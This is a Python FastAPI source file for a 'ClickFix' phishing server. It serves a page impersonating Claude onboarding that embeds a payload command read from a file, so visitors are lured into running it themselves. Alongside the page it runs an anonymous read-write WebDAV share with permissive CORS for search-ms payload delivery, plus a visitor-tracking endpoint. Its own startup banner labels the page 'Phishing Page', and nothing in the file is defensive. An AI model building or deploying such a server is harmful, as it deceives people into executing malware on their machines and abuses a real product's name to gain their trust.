"""
ClickFix Server v2.1 - Clean Version
Claude + search-ms WebDAV
"""

from pathlib import Path
from datetime import datetime
import yaml

from fastapi import FastAPI, Request, HTTPException,Response
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from wsgidav.wsgidav_app import WsgiDAVApp
from a2wsgi import WSGIMiddleware
import uvicorn


# ====================== CONFIG ======================
BASE_DIR = Path(__file__).parent
CONFIG_FILE = BASE_DIR / "config" / "config.yaml"
PAYLOAD_FILE = BASE_DIR / "payload" / "payload.txt"

def load_payload():
    """Load payload command from payload.txt"""
    if PAYLOAD_FILE.exists():
        with open(PAYLOAD_FILE, "r", encoding="utf-8") as f:
            return f.read()
    return ""

def load_config():
    if CONFIG_FILE.exists():
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            return yaml.safe_load(f) or {}
    return {
        "server": {"host": "0.0.0.0", "port": 8080},
        "webdav": {"enabled": True, "mount_path": "/dav", "root_folder": "dav", "anonymous": True},
        "template": "chatbot_onboarding.html",
        "debug": False
    }

config = load_config()

# ====================== WEBDAV ======================
class AnonymousDomainController:
    """Custom domain controller that always allows anonymous access"""
    def __init__(self, *args, **kwargs):
        pass
    
    def get_domain_realm(self, path, environ):
        return None
    
    def get_user(self, realm, username):
        return None
    
    def get_realm(self, realm):
        return None
    
    def require_authentication(self, realm, environ):
        return False  # Never require auth
    
    def get_user_realm(self, username):
        return None
    
    def isRealmUser(self, realm, username):
        return True
    
    def authTransFunc(self, username, password, environ):
        return username  # Accept any username/password
    
    def supports_http_digest_auth(self):
        return False
    
    def is_share_anonymous(self, path_info):
        return True
    
    def known_roles(self, path_info):
        return []
    
    def known_permissions(self, path_info, username):
        return ["r", "w"]
    
    def basic_auth_user(self, realm, user, password):
        return True
    
    def digest_auth_user(self, realm, user, hash):
        return True

def create_webdav_app():
    if not config["webdav"].get("enabled"):
        return None
    
    dav_root = BASE_DIR / config["webdav"].get("root_folder", "dav")
    dav_root.mkdir(exist_ok=True)
    
    # Create WebDAV app with anonymous access
    try:
        dav_config = {
            "provider_mapping": {
                "/": str(dav_root)
            },
            "http_authenticator": {
                "domain_controller": AnonymousDomainController,
                "accept_basic": True,
                "accept_digest": False,
                "default_to_digest": False,
            },
            "verbose": 1,
            "dir_browser": {"enable": True},
        }
        return WsgiDAVApp(dav_config)
    except Exception as e:
        print(f"[!] WebDAV init failed: {e}")
        return None

# ====================== APP ======================
app = FastAPI(title="Claude ClickFix", docs_url=None, redoc_url=None)

app.mount("/static", StaticFiles(directory=str(BASE_DIR / "static")), name="static")
templates = Jinja2Templates(directory=str(BASE_DIR / "templates"))

webdav_app = create_webdav_app()
if webdav_app:
    app.mount(config["webdav"]["mount_path"], WSGIMiddleware(webdav_app))
    print(f"[+] WebDAV mounted at {config['webdav']['mount_path']}")

# ====================== ROUTES ======================
@app.get("/", response_class=HTMLResponse)
async def root():
    return RedirectResponse(url="/claude")

@app.get("/claude", response_class=HTMLResponse)
async def claude_page(request: Request):
    modal_template = config.get("modal_template", "onboarding_template.html")
    payload_cmd = load_payload().strip()
    webdav_subdomain = config.get("webdav", {}).get("subdomain", request.url.hostname)
    
    return templates.TemplateResponse(
        request, 
        config.get("template"), 
        {
            "request": request, 
            "domain": request.url.hostname, 
            "modal_template": modal_template, 
            "payload_command": payload_cmd,
            "webdav_subdomain": webdav_subdomain
        }
    )

@app.post("/api/track")
async def track_event(request: Request):
    try:
        data = await request.json()
        print(f"[TRACK] {data}")
        return JSONResponse({"status": "ok"})
    except:
        return JSONResponse({"status": "error"}, status_code=400)
@app.options("/")
async def options_root():
    headers = {
        "DAV": "1, 2",
        "MS-Author-Via": "DAV",
        "Allow": "OPTIONS, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, DELETE, PUT, COPY, MOVE",
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "GET, POST, OPTIONS, PROPFIND, PROPPATCH, MKCOL, DELETE, PUT, COPY, MOVE",
        "Access-Control-Allow-Headers": "Content-Type, Depth, User-Agent, Translate, Overwrite, Destination, Lock-Token, If, Lock-Token, Timeout, X-Requested-With",
        "Access-Control-Expose-Headers": "DAV, MS-Author-Via",
    }
    return Response(status_code=200, headers=headers)

# CORS middleware for WebDAV
@app.middleware("http")
async def webdav_cors(request: Request, call_next):
    response = await call_next(request)
    if "/dav" in request.url.path:
        response.headers["Access-Control-Allow-Origin"] = "*"
        response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS, PROPFIND, PROPPATCH, MKCOL, DELETE, PUT, COPY, MOVE"
        response.headers["Access-Control-Allow-Headers"] = "*"
        response.headers["DAV"] = "1, 2"
        response.headers["MS-Author-Via"] = "DAV"
    return response
# ====================== START ======================
if __name__ == "__main__":
    server_cfg = config.get("server", {})
    cloudflare_cfg = config.get("cloudflare", {})
    
    host = server_cfg.get("host", "0.0.0.0")
    port = server_cfg.get("port", 80)
    ssl_enabled = server_cfg.get("ssl", False)
    cert_file = server_cfg.get("cert_file")
    key_file = server_cfg.get("key_file")
    is_cloudflare = cloudflare_cfg.get("enabled", False)
    ssl_mode = cloudflare_cfg.get("ssl_mode", "flexible")
    
    # Determine protocol
    if ssl_enabled:
        protocol = "https"
    elif is_cloudflare and ssl_mode == "full":
        protocol = "https"
    else:
        protocol = "http"
    
    print("="*70)
    print("ClickFix Server Started!")
    print(f"-> Mode: {'Cloudflare Full' if (is_cloudflare and ssl_mode == 'full') else 'Cloudflare Flexible' if is_cloudflare else 'Local HTTP'}")
    print(f"-> SSL: {'Enabled' if ssl_enabled else 'Disabled'}")
    print(f"-> Phishing Page : {protocol}://{host}:{port}/claude")
    print(f"-> WebDAV        : {protocol}://{host}:{port}/dav")
    print("="*70)
    
    if ssl_enabled:
        print(f"[*] SSL enabled - cert: {cert_file}")
        uvicorn.run(app, host=host, port=port, reload=False, ssl_certfile=cert_file, ssl_keyfile=key_file)
    else:
        uvicorn.run(app, host=host, port=port, reload=False)
